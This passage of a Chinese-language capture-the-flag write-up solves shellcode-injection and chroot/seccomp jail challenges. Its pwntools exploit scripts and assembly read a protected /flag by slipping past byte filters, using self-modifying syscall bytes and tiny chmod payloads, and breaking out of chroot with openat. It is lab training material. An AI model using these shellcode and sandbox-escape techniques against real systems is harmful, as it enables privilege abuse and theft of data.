<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;stack at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode).rjust(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<h2 id="4-造一个跳板"><a href="#4-造一个跳板" class="headerlink" title="4.造一个跳板"></a>4.造一个跳板</h2><blockquote>
<p>使用encode函数: No encoders for amd64 which can avoid b’H’</p>
<p>mov的一种编码第一个字节就是H, 所以没有办法.</p>
<p>只能使用先read再jmp的方法.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;memory at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br><span class="hljs-comment"># 通过测试程序的打印功能查到read编码0xf字节, 所以不用jmp直接接在后面</span><br>shellcode = shellcraft.amd64.read(<span class="hljs-number">0</span>, addr+<span class="hljs-number">0xf</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode)<br>p.sendline(payload)<br>p.recv() <span class="hljs-comment"># 无关紧要</span><br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>payload = asm(shellcode)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<h2 id="5-禁用syscall系列"><a href="#5-禁用syscall系列" class="headerlink" title="5.禁用syscall系列"></a>5.禁用syscall系列</h2><blockquote>
<p>啊这, 我这……. 折腾了半天重新看了看课件终于知道他要考我什么了.</p>
</blockquote>
<p>还可以用<code>mov byte ptr [rip + s01], 0x0f</code>这样的来改变shellcode本身. 依据在于将0f05两个字节分开来.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov byte ptr [rip+syscall1], 0x0f<br>mov byte ptr [rip+syscall2], 0x05<br></code></pre></div></td></tr></table></figure>

<p>exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary    <span class="hljs-comment"># 例行解决arch问题</span><br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;memory at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br><span class="hljs-comment"># dec BYTE PTR [rip+1]</span><br><span class="hljs-comment"># b&#x27;\xfe\r\x01\x00\x00\x00&#x27;</span><br>payload = asm(shellcode)<br><br>i = <span class="hljs-number">0</span><br><span class="hljs-comment"># len = len(payload)</span><br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(payload):<br>    <span class="hljs-keyword">if</span> payload[i]==<span class="hljs-number">0x0f</span> <span class="hljs-keyword">and</span> payload[i+<span class="hljs-number">1</span>]==<span class="hljs-number">0x05</span>:<br>        <span class="hljs-comment"># 发现syscall的0x0f05的时候换成一条dec指令+0x0f06, 注意到opcode已经换成了0x0f06</span><br>        <span class="hljs-comment"># 即CLTS(Clear Task-Switched Flag in CR0)指令.</span><br>        <span class="hljs-comment"># 如果整个0f04不存在的指令也行, 不会引起反汇编出现SIGSEGV</span><br>        payload = payload[:i] + <span class="hljs-string">b&#x27;\xfe\r\x01\x00\x00\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x0f\x06&#x27;</span> + payload[i+<span class="hljs-number">2</span>:]<br>        i+=<span class="hljs-number">8</span><br>    <span class="hljs-keyword">else</span>:<br>        i+=<span class="hljs-number">1</span><br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<p>6.同上, 限制前0x1000写入权限, 总共可写入0x2000</p>
<blockquote>
<p>只要read的buf在后4096字节, 然后<code>payload = payload.rjust(0x1500, b&#39;\x90&#39;)</code>即可.</p>
<p>居然栽在rjust这个函数上: 第一次以为rjust直接修改bytes, 但发现是个不可修改的class, 然后发现width是指修改完后的长度而不是直接在左边填充多少fillchar…</p>
</blockquote>
<h2 id="7-关闭stdio"><a href="#7-关闭stdio" class="headerlink" title="7.关闭stdio"></a>7.关闭stdio</h2><blockquote>
<p>照着课件的说法是每次返回1bit都能communicate…….</p>
<p>不过直接打开另外一个文件就行了. 居然栽在open syscall的o_flag上, 应该给个O_WRONLY或者O_RDWR.</p>
<p>shellcraft的open函数能接受int的o_flag或者字符串类型的flag. 只支持大写(这不是当然么, 汇编器只支持这种宏定义).</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#打开文件, rax存储fd, 从文件中读取到内存中addr+0x100, 然后写到stdout</span><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x200</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/hacker/res&quot;</span>, <span class="hljs-number">1</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x200</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br></code></pre></div></td></tr></table></figure>

<h2 id="8-限制写权限"><a href="#8-限制写权限" class="headerlink" title="8.限制写权限"></a>8.限制写权限</h2><blockquote>
<p>而且第一次只有0x12(18)字节的汇编字节可以输入. 后面的字节使用了 <code>mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC)</code>来限制再次write.</p>
</blockquote>
<p>emmmmmm……….</p>
<p>tips:</p>
<blockquote>
<p>In fact these are a lot of bytes. Try different <strong>sys calls</strong>. There are other ways to read a flag as well</p>
<p>Search for a syscall that takes minimal argument so as to decrease size</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/syscalls.2.html">syscalls man7</a> </p>
<p>找了半天, 只有个chmod能用, 居然刚好18字节, 真绝啊. 一开始想着读取文件肯定是做不到的, 因为只能写到buffer上, 塞不下更多的逻辑了.  18个字节真的太少, 只能换一个方向而去改变他的权限, 然后就可以任意读取了.</p>
<p>为了尽量节省空间, <code>&#39;/flag&#39;</code>放在了bytes的最后, 由起始地址addr计算出<code>/</code>的位置, 取代s1中9所在位置.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br>s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* chmod(file=&#x27;/flag&#x27;, mode=&#x27;S_IROTH&#x27;) */</span><br><span class="hljs-string">    mov edi, 9</span><br><span class="hljs-string">    mov sil, 0x04 /* S_IROTH == 0x04 */</span><br><span class="hljs-string">    /* call chmod() */</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>pos = s1.find(<span class="hljs-string">&#x27;9&#x27;</span>)<br>s1 = s1[:pos] + <span class="hljs-built_in">hex</span>(addr+<span class="hljs-number">12</span>) + s1[pos+<span class="hljs-number">1</span>:]<br>temp = asm(s1)<br>payload = payload + <span class="hljs-string">b&#x27;/flag&#x27;</span><br></code></pre></div></td></tr></table></figure>

<blockquote>
<p>不一定要用这种替换, 可以使用<code>lea rdi, [rip+0x??]</code> , 或者下面这个chown系统调用.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">lea rdi, [rip+0xf]<br>mov si, 0x3e8<br>mov dx, si<br>mov al, 92<br>syscall # chown(const char *pathname, uid_t owner, gid_t group)<br></code></pre></div></td></tr></table></figure>
</blockquote>
<p>13.同上, 而且变成0xc字节, 看来只能chown或者chmod了, 这里用chmod.</p>
<ul>
<li><p>?????好吧应该push到栈上, 然后再mov rsp, 这样子才能大幅度地减少字节长度.</p>
<p>而且由于是小端法存储, 自然地就有7个空字符在0x66后面.<br>gdb一看rax是put函数的返回值, 直接就是0. 这点挺重要: <strong>利用可预测的寄存器的值</strong> </p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">push byte ptr &#x27;f&#x27;    ;6a 66 <br>mov rdi, rsp		;48 89 e7<br>mov sil, 0x04		;40 b6 04<br>mov al, 0x5a		;b0 5a <br>syscall			    ;0f 05 长度为0xb  <br></code></pre></div></td></tr></table></figure>

<p>第二种方案是execv, 去执行shell, 不过文件开头要这么写<code>#!/bin/sh -p</code>, -p是防止默认的重置SUID操作. shell里面直接写<code>cat /flag</code>就成了</p>
<h2 id="9-被动修改"><a href="#9-被动修改" class="headerlink" title="9.被动修改"></a>9.被动修改</h2><blockquote>
<p>This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an<br>instruction is an <code>INT 3</code>, which is an interrupt to call into the debugger. You must avoid these modifications in your<br>shellcode.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* chmod(file=&#x27;/flag&#x27;, mode=&#x27;S_IROTH&#x27;) */</span><br><span class="hljs-string">    lea edi, [rip+0x22]</span><br><span class="hljs-string">    jmp done</span><br><span class="hljs-string">    .space 12</span><br><span class="hljs-string">done:</span><br><span class="hljs-string">    mov sil, 0x04 /* S_IROTH == 0x04 */</span><br><span class="hljs-string">    /* call chmod() */</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    .skip 13</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(s1) + <span class="hljs-string">b&#x27;/flag\x00&#x27;</span><br></code></pre></div></td></tr></table></figure>

<h2 id="10-sort-ur-shellcode"><a href="#10-sort-ur-shellcode" class="headerlink" title="10.sort ur shellcode"></a>10.sort ur shellcode</h2><blockquote>
<p>每8个字节作为一个64位无符号数, 使用冒泡排序升序排列. emmmmmm……</p>
</blockquote>
<p>非常刚好的每8字节从小到大排序, 主要的思想就是代码尽量少, 打开文件和读写放到另外一个文件中(c写的读文件), execve会继承父进程权限.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x632f2e</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    /* call execve() */</span><br><span class="hljs-string">    push SYS_execve /* 0x3b */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#   0:   68 2e 2f 61 00          push   0x612f2e</span><br><span class="hljs-comment">#   5:   48 89 e7                mov    rdi, rsp</span><br><span class="hljs-comment">#   8:   31 d2                   xor    edx, edx</span><br><span class="hljs-comment">#   a:   31 f6                   xor    esi, esi</span><br><span class="hljs-comment">#   c:   6a 3b                   push   0x3b</span><br><span class="hljs-comment">#   e:   58                      pop    rax</span><br><span class="hljs-comment">#   f:   0f 05                   syscall</span><br></code></pre></div></td></tr></table></figure>

<p>11.同上, 关闭stdin</p>
<blockquote>
<p>上一题仍然继续用.</p>
</blockquote>
<h2 id="12-每个byte得unique"><a href="#12-每个byte得unique" class="headerlink" title="12.每个byte得unique"></a>12.每个byte得unique</h2><blockquote>
<p><code>ascii_values = [ord(character) for character in text]</code>python字符串=&gt;ASCII</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x632f2e</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    lea edx, [esi] /* 0 */</span><br><span class="hljs-string">    /* call execve() */</span><br><span class="hljs-string">    push SYS_execve /* 0x3b */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure>

<p>出乎意料的简单, 只要把第二个xor改成lea指令去清空edx就可以了. 一开始改的mov还不行.</p>
<h2 id="14-只读6个字节"><a href="#14-只读6个字节" class="headerlink" title="14.只读6个字节"></a>14.只读6个字节</h2><blockquote>
<p>好像只能2-stage shellcode, emmmmmmmm…….</p>
</blockquote>
<p>仍然是利用了rax等于0, rdx是shellmem地址, 也可以当做是要读取的字节数使用read函数的话只有rsi(第二个参数)需要改为rdx上的地址, 简单mov就可以了. 然后第二阶段随便整.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor edi, edi</span><br><span class="hljs-string">mov esi, edx</span><br><span class="hljs-string">syscall	//call read(0, 0x14e40000, 0x14e40000)</span><br><span class="hljs-string">//2-stage shellcode</span><br><span class="hljs-string">.space 6, 0x90</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode += shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0x14e40000</span>+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x40</span>)<br>shellcode += shellcraft.amd64.write(<span class="hljs-number">1</span>,    <span class="hljs-number">0x14e40000</span>+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/hacker/input&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(payload)<br></code></pre></div></td></tr></table></figure>

<h1 id="module-5-jail"><a href="#module-5-jail" class="headerlink" title="module 5-jail"></a>module 5-jail</h1><ul>
<li><p>chroot(“/tmp/jail”)</p>
<ul>
<li><p>chroot(“/tmp/jail”) does NOT:</p>
<p>Close resources that reside outside of the jail.<br>cd (chdir()) into the jail.<br>Do anything else!</p>
</li>
<li><p>you can use open<strong>at</strong> and execve<strong>at</strong>: <code>int openat(**int dirfd**, char *pathname, int flags);</code></p>
<p>这两个函数的path如果是绝对路径, 那么dirfd就会被忽略;<br>如果path是相对路径, 而且dirfd是合法的, 那么path所引用的就是dirfd所表示的路径.</p>
</li>
<li><p>如果再次chroot会发生什么? kernel对此是完全不知情的.</p>
</li>
<li><p>Generally, a user with an effective ID of 0 (i.e., a process run as root or SUIDed to root) can <em><strong>always</strong></em> break out of a chroot, unless the chroot syscall is blocked!</p>
</li>
<li><p>Also missing other forms of isolation: <strong>PID, network, IPC</strong> </p>
</li>
<li><p>Replacements: <strong>cgroups, namespaces, seccomp</strong> </p>
</li>
</ul>
</li>
<li><p>seccomp: </p>
<ul>
<li><code>gcc -o test test.c -lseccomp</code> <code>seccomp-tools dump ./test</code> </li>
<li>原理是eBPF, seccomp就是使用的eBPF来实现的, 还可以用来实现一系列system trace <a target="_blank" rel="noopener" href="https://github.com/iovisor/bcc">tools</a> </li>
</ul>
</li>
<li><p>break out seccomp: Generally, to do anything useful, a sandboxed process needs to be able to communicate with the privileged process. 有两点可能, 第一是syscall很多, 有些可能可以被利用, 第二是开发者可能为了不破坏功能而在权限方面犯错误.</p>
<ul>
<li><strong>permissive policies</strong>: ptrace() sendmsg() prctl() process_vm_writev()</li>
<li><strong>syscall confusion:</strong> on some systems, you can switch between 32-bit mode with 64-bit mode <em>in the same process</em>, and the syscall numbers are different between architectures. 比如说系统调用分别是<code>int 0x80 and syscall</code>(<code>\xcd\x80 and \x0f\x05</code>), 系统调用号也不同.</li>
<li><strong>kernel vulnerabilities</strong> in the syscall handlers: Over 30 chrome sandbox escapes in 2019 <a target="_blank" rel="noopener" href="https://github.com/allpaca/chrome-sbx-db">link</a> </li>
<li>data exfiltration: such as sleep(), exit(), normal or crash. Or use DNS queries to bypass network egress filters.</li>
</ul>
</li>
</ul>
<blockquote>
<p>Redirections很重要. <a target="_blank" rel="noopener" href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html">link</a> </p>
</blockquote>
<p>补充:</p>
<ul>
<li>实际测试中在shell里面直接使用chroot命令并不会发生escape, 只能在c代码中使用chroot库函数. 猜测可能是因为chroot的命令行对系统调用进行了一层封装, 加上了跳转到jail里面的目录中; 而libc库中只是单纯的系统调用, 并没有chdir这个步骤.</li>
<li>好几个函数都有<code>at</code>的版本, chmod-&gt;fchmodat, open-&gt;openat(open只是libc中对openat的封装) and so forth.</li>
<li></li>
</ul>
<h3 id="1-exemplify"><a href="#1-exemplify" class="headerlink" title="1.exemplify"></a>1.exemplify</h3><p>相当简单, 直接利用程序中chroot后没有切换到jail里面的特点, 更改cwd为真正的根目录, 第一个参数填写为flag, 最后open的时候由于flag是相对地址, 会以真正的根目录作为基准来定位true flag.</p>
<h3 id="2-同第一题"><a href="#2-同第一题" class="headerlink" title="2.同第一题"></a>2.同第一题</h3><blockquote>
<p>第一个参数不能含有flag字符串, 是为了禁止直接打开flag文件. 在这个challenge中还可以注入shellcode, </p>
</blockquote>
<p>也没什么难的, 只要在shellcode里面打开‘flag’然后写到stdin里面就可以了.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/baby*[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process([binary, <span class="hljs-string">b&#x27;abc&#x27;</span>]) <span class="hljs-comment">#不能直接打开flag文件</span><br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;O_RDWR&#x27;</span>)<br>shellcode+= <span class="hljs-string">&#x27;lea r8, [rip]\nadd r8, 0x100&#x27;</span>	<span class="hljs-comment">#写到buf上, 估计很快就不行了.</span><br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br>payload += <span class="hljs-string">b&#x27;\x0f\x04&#x27;</span>	<span class="hljs-comment"># 随手加个非法指令,遇到SIGILL就知道shellcode肯定是执行完了.</span><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<h3 id="3-move-in"><a href="#3-move-in" class="headerlink" title="3.move in"></a>3.move in</h3><p>参数不能含有flag子串, 打开文件时有O_NOFOLLOW标志, 软连接无效,  而且在chdir之前只有一个open.<br>也不能在命令行里打开flag, 包括符号链接. 要跳出chroot也许只剩下再次chroot. 好像也不行, 看了看视频应该要用openat.<br>在kali上试试chroot. openat成功了.</p>
<ul>
<li>directory stream file descriptor和file descriptor不是同一个东西, 具体资料待查. openat只能用dirfd.</li>
<li>命令行里打出<code>./chroot flag 6&lt;.</code>即可, 会打开当前文件夹且dirfd=6.</li>
<li><strong>也可以直接打开fd=3, 这个是命令行第一个参数, 而且在chroot前被打开, 可以被openat使用.</strong> </li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/&quot;</span>+os.uname().nodename<br>context.binary = binary<br><br>shellcode = shellcraft.amd64.openat(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>) <br>shellcode += shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>) <br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/home/hacker/input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(payload)<br></code></pre></div></td></tr></table></figure>

<h3 id="4-seccomped-gt-openat"><a href="#4-seccomped-gt-openat" class="headerlink" title="4.seccomped -&gt; openat"></a>4.seccomped -&gt; openat</h3><blockquote>
<p>每一题的要求都在逐渐增加. 这一题仍然可以用openat, 没有变化.</p>
</blockquote>
